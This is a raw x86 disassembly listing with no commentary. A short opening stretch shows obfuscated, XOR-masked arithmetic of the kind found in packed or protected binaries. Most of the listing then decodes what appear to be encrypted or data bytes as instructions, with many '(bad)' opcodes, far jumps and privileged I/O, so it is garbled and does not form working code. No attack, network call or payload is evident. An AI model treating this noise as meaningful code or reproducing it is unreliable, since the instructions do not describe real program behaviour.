  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41848c:	(bad)  
  41848d:	sbb    DWORD PTR [edi],edi
  41848f:	int3   
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	cwde   
  418498:	mov    fs,WORD PTR [eax-0x2660e49d]
  41849e:	mov    ah,0x7e
  4184a0:	xchg   esi,eax
  4184a1:	fsubp  st(3),st
  4184a3:	bound  edx,QWORD PTR [eax+0x6db206be]
  4184a9:	dec    ebp
  4184aa:	push   0x28
  4184ac:	mov    ch,0x8a
  4184ae:	ins    BYTE PTR es:[edi],dx
  4184af:	aad    0xe5
  4184b1:	add    al,0xb
  4184b3:	bound  eax,QWORD PTR [ebx]
  4184b5:	sub    DWORD PTR [eax-0x3d],edi
  4184b8:	and    edx,DWORD PTR [edx+edi*8-0x350ee70c]
  4184bf:	xor    eax,0x51fe8661
  4184c4:	adc    ebx,DWORD PTR [ebp-0xe]
  4184c7:	push   ss
  4184c8:	stc    
  4184c9:	dec    edx
  4184ca:	jp     0x418460
  4184cc:	enter  0x59fb,0xb6
  4184d0:	dec    ecx
  4184d1:	es sahf 
  4184d3:	and    DWORD PTR [ebx],edx
  4184d5:	push   eax
  4184d6:	call   0x56f8:0x6b4d0dc9
  4184dd:	test   eax,0x27e01190
  4184e2:	cs das 
  4184e4:	adc    ebx,DWORD PTR [esi-0x40]
  4184e7:	je     0x418568
  4184e9:	pop    esp
  4184ea:	pop    edx
  4184eb:	lods   al,BYTE PTR ds:[esi]
  4184ec:	xchg   ecx,eax
  4184ed:	xor    eax,edi
  4184ef:	push   edx
  4184f0:	push   es
  4184f1:	add    al,0xf4
  4184f3:	push   esp
  4184f4:	inc    edx
  4184f5:	mov    ebp,0x4eb4fbfd
  4184fa:	jp     0x4184aa
  4184fc:	or     BYTE PTR [eax],bl
  4184fe:	icebp  
  4184ff:	sahf   
  418500:	mov    cs,ebx
  418502:	scas   al,BYTE PTR es:[edi]
  418503:	lods   al,BYTE PTR ds:[esi]
  418504:	iret   
  418505:	sub    al,0xa4
  418507:	retf   
  418508:	rcl    ah,0xa4
  41850b:	imul   edx,DWORD PTR [ebx+0x6962a867],0xa8914999
  418515:	repz in al,0x65
  418518:	sub    dh,0xc
  41851b:	stc    
  41851c:	loop   0x4184aa
  41851e:	fisttp WORD PTR [esp+edi*2-0x5a82b8cd]
  418525:	mov    cs,WORD PTR [ebx]
  418527:	jmp    0x41858a
  418529:	dec    edi
  41852a:	fdivr  DWORD PTR [eax]
  41852c:	loope  0x418562
  41852e:	nop
  41852f:	jle    0x4185a2
  418531:	jp     0x4184d6
  418533:	cmp    esp,DWORD PTR [edx+edx*1-0x53]
  418537:	sbb    BYTE PTR [esp+ecx*8-0x2],0xf9
  41853c:	sbb    edi,DWORD PTR [ebx-0x15b4a167]
  418542:	push   0x3832b236
  418547:	xor    eax,0x4795e22
  41854c:	sub    bl,ah
  41854e:	outs   dx,DWORD PTR ds:[esi]
  41854f:	jg     0x418507
  418551:	jno    0x41855c
  418553:	(bad)  
  418554:	fbld   TBYTE PTR [eax+0x1877ba6e]
  41855a:	jl     0x4184fd
  41855c:	mov    al,0xca
  41855e:	pop    edi
  41855f:	fnstsw WORD PTR [ebx+0x7c480437]
  418565:	mov    ebp,0x21be1281
  41856a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41856b:	xchg   ecx,eax
  41856c:	scas   al,BYTE PTR es:[edi]
  41856d:	test   eax,0x8d993c9e
  418572:	fxam   
  418574:	push   ebp
  418575:	int3   
  418576:	cmp    al,0xd
  418578:	rcr    BYTE PTR [ecx],0x85
  41857b:	cmp    DWORD PTR [eax-0x62],edi
  41857e:	sbb    DWORD PTR ss:[edi-0x33465305],eax
  418585:	pop    edi
  418586:	jp     0x41859a
  418588:	imul   edx,DWORD PTR [edi+0x69],0xffffffa8
  41858c:	pushf  
  41858d:	mov    ah,0xa7
  41858f:	mov    edx,0xbcb5d3eb
  418594:	sahf   
  418595:	xor    bh,BYTE PTR [edi]
  418597:	shl    DWORD PTR [ebp-0x41],0xc7
  41859b:	pop    ecx
  41859c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41859d:	aas    
  41859e:	outs   dx,BYTE PTR ds:[esi]
  4185a0:	(bad)  
  4185a1:	in     al,dx
  4185a2:	adc    DWORD PTR [eax-0xc9f1682],0x3f
  4185a9:	lods   eax,DWORD PTR ds:[esi]
  4185aa:	repnz daa 
  4185ac:	pop    DWORD PTR [edx]
  4185ae:	rcr    BYTE PTR [ebp+0x44],cl
  4185b1:	or     esp,DWORD PTR [edi+0x15]
  4185b4:	dec    edx
  4185b5:	popf   
  4185b6:	ds aad 0xd8
  4185b9:	jp     0x4185d3
  4185bb:	mov    ah,0x17
  4185bd:	push   esi
  4185be:	sub    BYTE PTR [edx-0x4bf238],0xe7
  4185c5:	xor    eax,0x9df0ad5c
  4185ca:	jnp    0x418557
  4185cc:	stos   BYTE PTR es:[edi],al
  4185cd:	mov    ah,0x91
  4185cf:	push   ss
  4185d0:	hlt    
  4185d1:	xchg   ebx,eax
  4185d2:	stos   DWORD PTR es:[edi],eax
  4185d3:	call   0x6b3e527c
  4185d8:	les    ebx,FWORD PTR [ebp-0xf]
  4185db:	(bad)  
  4185dc:	arpl   si,si
  4185de:	mov    eax,0x92479b7c
  4185e3:	fdiv   st,st(4)
  4185e5:	mov    cl,0xcb
  4185e7:	sub    BYTE PTR [edx],0x5
  4185ea:	add    BYTE PTR [eax*4-0x1749817e],ah
  4185f1:	mov    esi,DWORD PTR [ebx+0x5f]
  4185f4:	pushf  
  4185f5:	lahf   
  4185f6:	inc    ebp
  4185f7:	dec    ebx
  4185f8:	and    BYTE PTR [edx],dl
  4185fa:	xchg   ebx,eax
  4185fb:	icebp  
  4185fc:	inc    esi
  4185fd:	mov    bl,0xae
  4185ff:	leave  
  418600:	das    
  418601:	sbb    DWORD PTR [esi-0x201d8f94],edi
  418607:	outs   dx,BYTE PTR ds:[esi]
  418608:	and    DWORD PTR [ebx],ebp
  41860a:	sar    dh,1
  41860c:	push   ebx
  41860d:	adc    al,0x8d
  41860f:	std    
  418610:	cmp    DWORD PTR [ebx+eiz*1+0x424d7b26],ebx
  418617:	jmp    0x96f8:0xd1aa4df8
  41861e:	or     BYTE PTR [ebx-0x646d20b],dh
  418624:	lods   eax,DWORD PTR ds:[esi]
  418625:	dec    esp
  418626:	je     0x41860c
  418628:	mov    bh,0x5a
  41862a:	push   es
  41862b:	daa    
  41862c:	push   esp
  41862d:	sbb    eax,0xd5a07f36
  418632:	(bad)  
  418633:	sbb    cl,BYTE PTR [esi-0x8ddfc1]
  418639:	arpl   di,di
  41863b:	rcr    BYTE PTR [edi-0x55b8e1c0],cl
  418641:	outs   dx,BYTE PTR ds:[esi]
  418642:	nop
  418643:	nop
  418644:	popf   
  418645:	mov    ch,ch
  418647:	adc    DWORD PTR [ebx+0x7e],0xffffffc8
  41864b:	jle    0x4185fc
  41864d:	ds push esp
  41864f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418650:	daa    
  418651:	dec    eax
  418652:	stos   DWORD PTR es:[edi],eax
  418653:	mov    ebx,0xa18b56a
  418658:	lds    eax,FWORD PTR [edx+0x1c4711bb]
  41865e:	out    dx,eax
  41865f:	cmp    DWORD PTR [esi-0x46],esp
  418662:	hlt    
  418663:	mov    al,ds:0x66cbecfb
  418668:	out    0xe8,al
  41866a:	or     al,bl
  41866c:	jmp    0xecc5d33d
  418671:	inc    esp
  418672:	push   0xe6210fc
  418677:	jge    0x4186a4
  418679:	adc    DWORD PTR [ebp-0x704b2735],esp
  41867f:	clc    
  418680:	or     BYTE PTR [esp+eax*1],0xd1
  418684:	pop    ds
  418685:	inc    edi
  418686:	jae    0x41865a
  418688:	push   esp
  418689:	and    dh,BYTE PTR [ecx+0x2932db11]
  41868f:	rol    BYTE PTR [esi],cl
  418691:	pop    ss
  418692:	(bad)  
  418693:	fiadd  DWORD PTR [esi+0x6e]
  418696:	pop    esi
  418697:	push   0x76362f03
  41869c:	loopne 0x41864b
  41869e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41869f:	cmp    eax,0xcd1e6bb2
  4186a4:	dec    ebx
  4186a5:	xchg   ebx,eax
  4186a6:	repnz and ah,dl
  4186a9:	outs   dx,DWORD PTR ds:[esi]
  4186aa:	mov    al,ds:0x52f56fa1
  4186af:	dec    ebp
  4186b0:	inc    ebx
  4186b1:	adc    esi,edi
  4186b3:	dec    edi
  4186b4:	std    
  4186b5:	stos   DWORD PTR es:[edi],eax
  4186b6:	loop   0x418701
  4186b8:	xor    al,0x6f
  4186ba:	mov    edi,0xf820c2b9
  4186bf:	test   eax,0xef578206
  4186c4:	adc    bl,cl
  4186c6:	loopne 0x41868f
  4186c8:	ins    BYTE PTR es:[edi],dx
  4186c9:	sub    ch,BYTE PTR [edx+0x35d5394f]
  4186cf:	sub    eax,0x795d5527
  4186d4:	push   ecx
  4186d5:	repz mov ah,0x44
  4186d8:	cmp    eax,0x2f64e3dc
  4186dd:	sti    
  4186de:	mov    ch,0x58
  4186e0:	adc    edx,ebx
  4186e2:	test   dl,0xae
  4186e5:	fidiv  WORD PTR [ecx]
  4186e7:	mov    eax,0x7dfacd00
  4186ec:	repnz pusha 
  4186ee:	xchg   edi,eax
  4186ef:	shl    BYTE PTR [eax+0x15],cl
  4186f2:	xchg   DWORD PTR [edx],ebx
  4186f4:	aam    0x14
  4186f6:	ss xor eax,0x4108afd9
  4186fc:	popf   
  4186fd:	inc    ebp
  4186fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186ff:	ret    0x23b
  418702:	lgs    ebp,FWORD PTR [edx-0x35]
  418706:	dec    ebp
  418707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418708:	pop    ebx
  418709:	jnp    0x41872e
  41870b:	imul   esi,DWORD PTR [eax],0xffffffcb
  41870e:	mov    gs,edi
  418710:	mov    ds:0xc10c075e,al
  418715:	push   edi
  418716:	jnp    0x4186f5
  418718:	sbb    al,0x3f
  41871a:	out    0xfa,al
  41871c:	and    al,BYTE PTR [esi+edx*1]
  41871f:	fucompp 
  418721:	mov    al,ds:0x1eaf3085
  418726:	out    dx,al
  418727:	outs   dx,DWORD PTR ds:[esi]
  418728:	pop    edi
  418729:	pop    esi
  41872a:	push   esi
  41872b:	pusha  
  41872c:	mov    ah,BYTE PTR [esi]
  41872e:	inc    ebx
  41872f:	fmul   DWORD PTR [ebx]
  418731:	xchg   ebx,eax
  418732:	jo     0x41879b
  418734:	loope  0x4186de
  418736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418737:	scas   eax,DWORD PTR es:[edi]
  418738:	enter  0x65ea,0xe9
  41873c:	test   DWORD PTR [eax],edx
  41873e:	mov    esp,0x708777b4
  418743:	mov    BYTE PTR [ebx+0x2363901c],ah
  418749:	cld    
  41874a:	xor    al,0xde
  41874c:	push   ss
  41874d:	mov    cs,WORD PTR [edx]
  41874f:	xor    al,0x57
  418751:	bound  ebx,QWORD PTR [esi]
  418753:	outs   dx,DWORD PTR ds:[esi]
  418754:	mov    ds:0x69fa9ce1,al
  418759:	sbb    DWORD PTR [ebp+0x17],ebp
  41875c:	dec    esp
  41875d:	stc    
  41875e:	popf   
  41875f:	das    
  418760:	sti    
  418761:	(bad)  
  418762:	push   esi
  418763:	mov    cl,0xcc
  418765:	pop    edi
  418766:	sub    DWORD PTR [ebx+ebp*1],ebp
  418769:	adc    ecx,DWORD PTR [ebp+0x6d3b93bf]
  41876f:	mov    al,ds:0xf6f8cdf1
  418774:	dec    edx
  418775:	pop    ds
  418776:	int3   
  418777:	bound  edi,QWORD PTR [ecx]
  418779:	and    BYTE PTR [ebx-0x55],bh
  41877c:	out    0xa6,eax
  41877e:	push   ecx
  41877f:	test   eax,0x5da8ac68
  418784:	out    dx,eax
  418785:	add    BYTE PTR [bx],dh
  418788:	push   esi
  418789:	add    eax,0x5f5b8d0
  41878e:	dec    eax
  41878f:	je     0x418799
  418791:	ss fwait
  418793:	xor    BYTE PTR [edx+0x2a2a77cf],0xb1
  41879a:	rcr    dh,cl
  41879c:	adc    bh,BYTE PTR [esi+0x74]
  41879f:	mov    esi,0xe0566202
  4187a4:	xchg   edx,eax
  4187a5:	push   esp
  4187a6:	xor    bl,BYTE PTR [esi]
  4187a8:	add    ah,BYTE PTR [edx]
  4187aa:	push   ds
  4187ab:	inc    eax
  4187ac:	mov    al,0xe6
  4187ae:	addr16 mov ebp,0xeed7178
  4187b4:	add    BYTE PTR [edx+0x319135c1],dl
  4187ba:	xchg   esi,eax
  4187bb:	scas   al,BYTE PTR es:[edi]
  4187bc:	dec    ecx
  4187bd:	inc    eax
  4187be:	out    dx,eax
  4187bf:	xchg   ebp,eax
  4187c0:	xchg   ecx,eax
  4187c1:	gs je  0x4187e0
  4187c4:	mov    al,0xd5
  4187c6:	mov    eax,ds:0x1b56a45a
  4187cb:	adc    al,0x5c
  4187cd:	adc    al,bl
  4187cf:	xchg   edi,eax
  4187d0:	pop    ds
  4187d1:	mov    esp,0x7172665
  4187d6:	(bad)  
  4187d7:	or     BYTE PTR [edi+0x18801880],ch
  4187dd:	and    DWORD PTR [ecx],0x2b83ac9a
  4187e3:	ror    DWORD PTR cs:[ebx-0xaee9e0c],cl
  4187ea:	fimul  WORD PTR [ecx]
  4187ec:	xor    DWORD PTR [edi-0x6052d03f],ecx
  4187f2:	rol    DWORD PTR [esi-0x1b479f8d],cl
  4187f8:	push   edi
  4187f9:	ret    0x56ae
  4187fc:	out    dx,eax
  4187fd:	les    ecx,FWORD PTR [eax-0x19]
  418800:	push   cs
  418801:	jne    0x418844
  418803:	daa    
  418804:	loope  0x4187f7
  418806:	cwde   
  418807:	imul   eax,DWORD PTR [ecx-0x42],0x4c5ca947
  41880e:	enter  0xb3e0,0x87
  418812:	jns    0x418803
  418814:	mov    ds:0x255660b3,eax
  418819:	jg     0x4187d6
  41881b:	jp     0x4187d4
  41881d:	push   edi
  41881e:	out    0x2d,al
  418820:	aaa    
  418821:	es push es
  418823:	arpl   WORD PTR [ecx],si
  418825:	test   DWORD PTR [edx+ebp*4-0x43],edx
  418829:	int3   
  41882a:	xchg   esp,eax
  41882b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41882c:	jecxz  0x4187db
  41882e:	pop    esp
  41882f:	gs fwait
  418831:	aam    0xc3
  418833:	jmp    0x4187cf
  418835:	(bad)  
  418836:	sbb    dh,BYTE PTR [esi-0x12]
  418839:	pop    eax
  41883a:	out    dx,eax
  41883b:	call   0xb600:0x31535699
  418842:	out    0x24,eax
  418844:	test   eax,0x8c6961bd
  418849:	mov    cl,0x5d
  41884b:	adc    eax,0xe4bf3477
  418850:	cdq    
  418851:	xor    eax,0xe06034b4
  418856:	(bad)  
  418857:	and    DWORD PTR [eax],ecx
  418859:	ins    BYTE PTR es:[edi],dx
  41885a:	pop    ecx
  41885b:	in     al,dx
  41885c:	add    cl,BYTE PTR [ecx]
  41885e:	dec    edi
  41885f:	sub    eax,0xffffff88
  418862:	mov    eax,esi
  418864:	scas   al,BYTE PTR es:[edi]
  418865:	popf   
  418866:	mov    ecx,0x1dc03d41
  41886b:	ins    BYTE PTR es:[edi],dx
  41886c:	jl     0x4188b3
  41886e:	aam    0x70
  418870:	clc    
  418871:	mov    BYTE PTR [eax],ah
  418873:	push   edx
  418874:	jmp    0xfdfbe101
  418879:	sti    
  41887a:	jns    0x4188b4
  41887c:	cmp    ecx,DWORD PTR [edi+0x5]
  41887f:	std    
  418880:	sub    ecx,DWORD PTR [edi]
  418882:	(bad)  
  418883:	mov    dh,0xbe
  418885:	fcmovne st,st(6)
  418887:	xchg   ebp,eax
  418888:	jg     0x418890
  41888a:	dec    ecx
  41888b:	stos   DWORD PTR es:[edi],eax
  41888c:	loopne 0x418818
  41888e:	out    dx,al
  41888f:	loopne 0x4188ba
  418891:	mov    ebp,0x7e57e67a
  418896:	out    0x14,al
  418898:	adc    cl,ch
  41889a:	jecxz  0x4188a3
  41889c:	adc    ecx,DWORD PTR [ecx-0x33]
  41889f:	adc    esi,DWORD PTR [esp+esi*2]
  4188a2:	and    eax,0x743a382d
  4188a7:	mov    esi,0xa4654225
  4188ac:	jb     0x418848
  4188ae:	dec    ebp
  4188af:	fwait
  4188b0:	cmc    
  4188b1:	lahf   
  4188b2:	pop    ebp
  4188b3:	inc    edx
  4188b4:	mov    ch,0xca
  4188b6:	clc    
  4188b7:	mov    dh,0xf7
  4188b9:	lods   eax,DWORD PTR ds:[esi]
  4188ba:	mov    esi,0x23c4d3da
  4188bf:	aaa    
  4188c0:	dec    ebp
  4188c1:	loope  0x418866
  4188c3:	jg     0x4188d7
  4188c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188c6:	adc    eax,0xc0ebcce5
  4188cb:	pop    ss
  4188cc:	popf   
  4188cd:	dec    edx
  4188ce:	mov    dl,0x24
  4188d0:	loope  0x4188ac
  4188d2:	xchg   esp,eax
  4188d3:	aad    0x28
  4188d5:	jmp    FWORD PTR [esi+0x4a]
  4188d8:	fucomip st,st(1)
  4188da:	mov    ebp,0x420509d0
  4188df:	xchg   esp,eax
  4188e0:	pop    ecx
  4188e1:	sbb    ah,bh
  4188e3:	dec    eax
  4188e4:	or     eax,0x682bc304
  4188e9:	pop    edi
  4188ea:	xor    ah,BYTE PTR [edi-0x7e]
  4188ed:	cmp    al,0xee
  4188ef:	mov    al,0xfa
  4188f1:	ja     0x4188ef
  4188f3:	jmp    0x52c1:0xdcc0b8f1
  4188fa:	das    
  4188fb:	repz pop ecx
  4188fd:	inc    edi
  4188fe:	pop    ebp
  4188ff:	bound  ebx,QWORD PTR [ebp-0x4b43b28b]
  418905:	into   
  418906:	rol    DWORD PTR [esp+ebx*1+0x242c746b],1
  41890d:	xlat   BYTE PTR ds:[ebx]
  41890e:	push   edx
  41890f:	ds gs jnp 0x4188d8
  418913:	ret    
  418914:	call   0x5239:0x457831b8
  41891b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41891c:	sub    BYTE PTR [ecx],cl
  41891e:	bound  ebx,QWORD PTR [ecx+0x59308f61]
  418924:	pop    ss
  418925:	cmp    eax,0x81a025e7
  41892a:	xor    eax,0xde008132
  41892f:	push   0x3d4edea8
  418934:	pop    eax
  418935:	jb     0x418928
  418937:	pop    ebx
  418938:	outs   dx,DWORD PTR ds:[esi]
  418939:	jmp    FWORD PTR [edi+0x2e243e57]
  41893f:	retf   
  418940:	rcr    DWORD PTR [edx-0x74],1
  418943:	mov    WORD PTR [ecx+0x33],gs
  418946:	ret    
  418947:	aam    0x1f
  418949:	(bad)  
  41894a:	xor    al,0x52
  41894c:	jae    0x418987
  41894e:	push   esp
  41894f:	jnp    0x418996
  418951:	sahf   
  418952:	rol    BYTE PTR [edi],cl
  418954:	fbstp  TBYTE PTR [esi+0x671155a3]
  41895a:	xor    BYTE PTR [edx-0x3ed2f0b5],cl
  418960:	dec    ebx
  418961:	stos   DWORD PTR es:[edi],eax
  418962:	mov    cl,0xf4
  418964:	outs   dx,DWORD PTR ds:[si]
  418966:	add    dl,ch
  418968:	pop    ds
  418969:	xchg   edi,eax
  41896a:	mov    ebx,edi
  41896c:	cs nop
  41896e:	(bad)  
  41896f:	or     BYTE PTR [esi-0x5a43a2a7],dh
  418975:	and    BYTE PTR [eax-0x5ba176ab],0x10
  41897c:	dec    DWORD PTR [ebp+0x16]
  41897f:	ss xchg edi,eax
  418981:	(bad)  
  418983:	lods   eax,DWORD PTR ds:[esi]
  418984:	mov    al,ds:0x4942d763
  418989:	cli    
  41898a:	jecxz  0x4189e0
  41898c:	inc    edx
  41898d:	sub    al,0x47
  41898f:	fistp  WORD PTR [eax]
  418991:	lock lods eax,DWORD PTR ds:[esi]
  418993:	inc    ebx
  418994:	jae    0x418944
  418996:	xchg   esi,eax
  418997:	ins    DWORD PTR es:[edi],dx
  418998:	and    edi,DWORD PTR [esi]
  41899a:	push   edx
  41899b:	(bad)  
  41899d:	cld    
  41899e:	sbb    DWORD PTR [edx],ebp
  4189a0:	xchg   ebx,eax
  4189a1:	mov    dl,0x88
  4189a3:	je     0x418a22
  4189a5:	pop    ebp
  4189a6:	int3   
  4189a7:	mov    ebp,0x6c22e61f
  4189ac:	inc    ebx
  4189ad:	xchg   esi,eax
  4189ae:	and    ebp,esp
  4189b0:	pop    edx
  4189b1:	push   ebp
  4189b2:	or     eax,0x2da99e72
  4189b7:	(bad)  
  4189b9:	jo     0x418948
  4189bb:	mov    ds:0x3b61aea,eax
  4189c0:	sti    
  4189c1:	inc    ebx
  4189c2:	vunpcklps xmm1,xmm1,XMMWORD PTR [esi+0x974bc49]
  4189ca:	xchg   edx,eax
  4189cb:	(bad)  
  4189cc:	clc    
  4189cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189ce:	icebp  
  4189cf:	mov    dh,0xaa
  4189d1:	fneni(8087 only) 
  4189d3:	pop    eax
  4189d4:	stos   BYTE PTR es:[edi],al
  4189d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d6:	icebp  
  4189d7:	sub    edi,esi
  4189d9:	mov    ah,0xa3
  4189db:	inc    esi
  4189dc:	in     eax,dx
  4189dd:	mov    es,WORD PTR [ebx-0x66]
  4189e0:	js     0x418a53
  4189e2:	dec    ebx
  4189e3:	push   0x3e
  4189e5:	shl    BYTE PTR [edx+0x5384ec1a],cl
  4189eb:	jno    0x4189de
  4189ed:	test   DWORD PTR [edx+0x2f],ecx
  4189f0:	pop    ss
  4189f1:	ror    DWORD PTR [esi-0xc],0x6e
  4189f5:	push   eax
  4189f6:	adc    ah,BYTE PTR [ebp+0x7e]
  4189f9:	push   es
  4189fa:	cli    
  4189fb:	and    eax,0x8ea3fcc7
  418a00:	ins    BYTE PTR es:[edi],dx
  418a01:	retf   0x77f6
  418a04:	sub    eax,0xf51a7b7c
  418a09:	jnp    0x4189ea
  418a0b:	and    al,0x2
  418a0d:	dec    edi
  418a0e:	mov    edi,0x22bd0fae
  418a13:	sbb    edi,DWORD PTR ds:0xd3494194
  418a19:	cmp    eax,0xe6fdacce
  418a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a1f:	jae    0x418a7a
  418a21:	mov    ds:0x8d8895cb,eax
  418a26:	inc    esi
  418a27:	push   ebx
  418a28:	test   ch,bh
  418a2a:	call   FWORD PTR [edx+edx*8-0x4f]
  418a2e:	out    dx,al
  418a2f:	pop    esp
  418a30:	push   0x2d
  418a32:	mov    edi,0x6655c432
  418a37:	xchg   bl,ah
  418a39:	lods   eax,DWORD PTR ds:[esi]
  418a3a:	lods   eax,DWORD PTR ds:[esi]
  418a3b:	jne    0x418a92
  418a3d:	pop    ebp
  418a3e:	data16 stos BYTE PTR es:[edi],al
  418a40:	jle    0x418a12
  418a42:	xor    cl,dl
  418a44:	orps   xmm0,XMMWORD PTR [esi+0x303d521d]
  418a4b:	dec    esi
  418a4c:	push   esp
  418a4d:	inc    eax
  418a4e:	jnp    0x418a26
  418a50:	add    ch,bh
  418a52:	call   0xa10c:0xd83aef98
  418a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a5a:	push   edx
  418a5b:	loope  0x418aaa
  418a5d:	inc    ebp
  418a5e:	mov    DWORD PTR [ecx-0x16860e24],edi
  418a64:	pop    edi
  418a65:	mov    bl,0x41
  418a67:	stos   BYTE PTR es:[edi],al
  418a68:	inc    esi
  418a69:	or     al,dl
  418a6b:	sub    ebx,DWORD PTR [esi-0x13]
  418a6e:	call   0x9f7ecd94
  418a73:	and    eax,0x2d329eb
  418a78:	jno    0x418a36
  418a7a:	push   ebx
  418a7b:	lock dec ecx
  418a7d:	mov    ecx,0x186ac9c2
  418a82:	(bad)  
  418a83:	push   esp
  418a84:	pop    DWORD PTR [edi-0x79efb8b]
  418a8a:	loopne 0x418a89
  418a8c:	test   BYTE PTR [ebx],dl
  418a8e:	scas   al,BYTE PTR es:[edi]
  418a8f:	lahf   
  418a90:	add    al,0xb6
  418a92:	mov    dl,0xf8
  418a94:	scas   eax,DWORD PTR es:[edi]
  418a95:	retf   
  418a96:	mul    ecx
  418a98:	cmp    eax,DWORD PTR [eax]
  418a9a:	out    dx,eax
  418a9b:	stos   DWORD PTR es:[edi],eax
  418a9c:	sbb    ebx,esp
  418a9e:	cmp    al,0x25
  418aa0:	or     bl,dl
  418aa2:	push   esp
  418aa3:	mov    ecx,0x3744f4f1
  418aa8:	aas    
  418aa9:	cmp    eax,edx
  418aab:	les    esi,FWORD PTR [ecx]
  418aad:	mov    bh,0x79
  418aaf:	enter  0xf966,0xee
  418ab3:	outs   dx,DWORD PTR ds:[esi]
  418ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ab5:	retf   0x860a
  418ab8:	cmp    dh,BYTE PTR [edx+ecx*2]
  418abb:	push   0xd05703c
  418ac0:	repnz mov eax,0x2d789f51
  418ac6:	sbb    DWORD PTR [ebx-0x6e],esp
  418ac9:	aam    0xec
  418acb:	and    DWORD PTR [edx+0x2341fa44],ebp
  418ad1:	mov    esp,0xfb36b0fe
  418ad6:	mov    DWORD PTR [edi+0x38],ebx
  418ad9:	dec    esi
  418ada:	jb     0x418aed
  418adc:	fisub  DWORD PTR ds:0xb84304d
  418ae2:	shl    DWORD PTR [ebx+ecx*4],0x15
  418ae6:	xchg   edi,eax
  418ae7:	inc    edx
  418ae8:	inc    ecx
  418ae9:	sub    ebp,DWORD PTR [ecx]
  418aeb:	bound  ecx,QWORD PTR [ecx-0x5b]
  418aee:	mov    DWORD PTR [eax-0x10d41890],0xc0fdc352
  418af8:	adc    DWORD PTR [ebx+0x56],ebp
  418afb:	push   ds
  418afc:	push   0x48
  418afe:	adc    eax,0xe2c3289c
  418b03:	cwde   
  418b04:	arpl   sp,di
  418b06:	nop
  418b07:	aad    0x7a
  418b09:	test   al,dh
  418b0b:	sbb    ecx,DWORD PTR es:[esi+0x43]
  418b0f:	sub    al,0x43
  418b11:	jbe    0x418b2c
  418b13:	push   ecx
  418b14:	iret   
  418b15:	and    BYTE PTR [edx+edx*1+0x3d],dl
  418b19:	mov    al,ds:0x309fe53a
  418b1e:	add    BYTE PTR [esp+eiz*4+0x17],bl
  418b22:	nop
  418b23:	cld    
  418b24:	xchg   ebp,eax
  418b25:	out    dx,eax
